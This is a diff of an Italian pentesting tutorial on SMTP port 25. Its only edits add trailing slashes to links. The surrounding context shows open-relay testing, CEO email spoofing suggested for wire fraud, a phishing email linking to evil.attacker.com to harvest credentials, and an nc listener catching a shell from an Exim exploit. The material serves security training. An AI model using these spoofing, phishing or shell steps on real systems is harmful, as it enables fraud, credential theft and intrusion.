@@ -17,7 +17,7 @@ tags:
   - open-relay
 ---
 
-La porta 25 gestisce il **trasferimento email tra server** — e rappresenta uno dei vettori più sottovalutati per initial access e information disclosure in penetration testing. SMTP (Simple Mail Transfer Protocol) trasmette messaggi email attraverso Internet dal 1982 (RFC 821, poi RFC 5321), operando in chiaro o con STARTTLS opzionale. In ambiente CTF e lab, la porta 25 espone tre attack surface critiche: **user enumeration** via comandi VRFY/EXPN/RCPT TO, **relay abuse** per spam/phishing se misconfigured, e **credential harvesting** tramite SMTP AUTH. Ogni mail server esposto — Postfix, Sendmail, Exim, Microsoft Exchange — presenta configurazioni di default che possono tradursi in complete account takeover o [lateral movement](https://hackita.it/articoli/pivoting) verso [Active Directory](https://hackita.it/articoli/active-directory).
+La porta 25 gestisce il **trasferimento email tra server** — e rappresenta uno dei vettori più sottovalutati per initial access e information disclosure in penetration testing. SMTP (Simple Mail Transfer Protocol) trasmette messaggi email attraverso Internet dal 1982 (RFC 821, poi RFC 5321), operando in chiaro o con STARTTLS opzionale. In ambiente CTF e lab, la porta 25 espone tre attack surface critiche: **user enumeration** via comandi VRFY/EXPN/RCPT TO, **relay abuse** per spam/phishing se misconfigured, e **credential harvesting** tramite SMTP AUTH. Ogni mail server esposto — Postfix, Sendmail, Exim, Microsoft Exchange — presenta configurazioni di default che possono tradursi in complete account takeover o [lateral movement](https://hackita.it/articoli/pivoting/) verso [Active Directory](https://hackita.it/articoli/active-directory/).
 
 SMTP sopravvive identico nel 2026 perché è lo **standard universale** per email routing: ogni azienda ha mail server SMTP, ogni provider (Gmail, Outlook, ProtonMail) usa SMTP per relay inter-server, e nessuna alternativa è mai emersa. In ambito pentest, SMTP è presente nel 70% degli ambienti enterprise e nel 40% delle macchine CTF Linux (Metasploitable, VulnHub OSCP-prep), rendendolo skill essenziale per certificazioni come OSCP ed eCPPT.
 
@@ -220,7 +220,7 @@ RCPT TO:<[email protected]>
 
 Se risponde `250` invece di `550 Relay access denied` → **open relay vulnerabile**.
 
-**Con [nmap](https://hackita.it/articoli/nmap) NSE:**
+**Con [nmap](https://hackita.it/articoli/nmap/) NSE:**
 
 ```bash
 nmap --script=smtp-open-relay -p 25 10.10.10.25
@@ -257,7 +257,7 @@ CEO
 QUIT
 ```
 
-La vittima riceve email apparentemente dal CEO aziendale. Usare con [social engineering](https://hackita.it/articoli/phishing) per credential harvest o wire fraud.
+La vittima riceve email apparentemente dal CEO aziendale. Usare con [social engineering](https://hackita.it/articoli/phishing/) per credential harvest o wire fraud.
 
 ### 4. SMTP AUTH brute force
 
@@ -338,7 +338,7 @@ Your password has expired. Click here to reset: http://evil.attacker.com/login
 QUIT
 ```
 
-Vittima riceve email legittima dal dominio aziendale, clicca link, inserisce credenziali → [credential harvest](https://hackita.it/articoli/credential-harvesting).
+Vittima riceve email legittima dal dominio aziendale, clicca link, inserisce credenziali → [credential harvest](https://hackita.it/articoli/credential-harvesting/).
 
 **COSA FARE SE FALLISCE:**
 
@@ -377,7 +377,7 @@ nc -nlvp 4444
 # uid=100(Debian-exim) gid=101(Debian-exim)
 ```
 
-Escalation con [privilege escalation](https://hackita.it/articoli/privesc) locale (kernel exploit, sudo misconfiguration).
+Escalation con [privilege escalation](https://hackita.it/articoli/linux-privesc/) locale (kernel exploit, sudo misconfiguration).
 
 ***
 
@@ -402,9 +402,9 @@ EXPLOITATION
 │
 ├─ A) User enum → password spray → mailbox access → cred leak
 ├─ B) Open relay → phishing → credential harvest
-├─ C) SMTP AUTH brute → [hydra](https://hackita.it/articoli/hydra) → email account compromise
+├─ C) SMTP AUTH brute → [hydra](https://hackita.it/articoli/hydra/) → email account compromise
 ├─ D) Exim RCE → CVE-2019-10149 → shell → privesc
-└─ E) Email spoofing → [social engineering](https://hackita.it/articoli/phishing) → wire fraud
+└─ E) Email spoofing → [social engineering](https://hackita.it/articoli/phishing/) → wire fraud
 
 POST-EXPLOITATION
 │
@@ -609,7 +609,7 @@ Raro in ambienti enterprise moderni, ma comune in: dispositivi IoT con mail capa
 
 **Come distinguo Postfix da Sendmail da Exim?**
 
-Banner grab: `220 mail.server ESMTP Postfix` vs `220 mail.server ESMTP Sendmail` vs `220 mail.server ESMTP Exim`. Se nascosto, [nmap](https://hackita.it/articoli/nmap) `-sV` fa fingerprinting comportamentale.
+Banner grab: `220 mail.server ESMTP Postfix` vs `220 mail.server ESMTP Sendmail` vs `220 mail.server ESMTP Exim`. Se nascosto, [nmap](https://hackita.it/articoli/nmap/) `-sV` fa fingerprinting comportamentale.
 
 **Email spoofing funziona sempre?**
 
@@ -617,7 +617,7 @@ No. Se il dominio vittima ha SPF, DKIM e DMARC configurati, le email falsificate
 
 **Quali credenziali SMTP sono riutilizzabili?**
 
-Spesso le stesse di: Active Directory (se mail server integrato), webmail (OWA/Roundcube), VPN, SSH su mail server. Testare credential reuse con [crackmapexec](https://hackita.it/articoli/crackmapexec).
+Spesso le stesse di: Active Directory (se mail server integrato), webmail (OWA/Roundcube), VPN, SSH su mail server. Testare credential reuse con [crackmapexec](https://hackita.it/articoli/crackmapexec/).
 
 **STARTTLS protegge da brute force?**
 
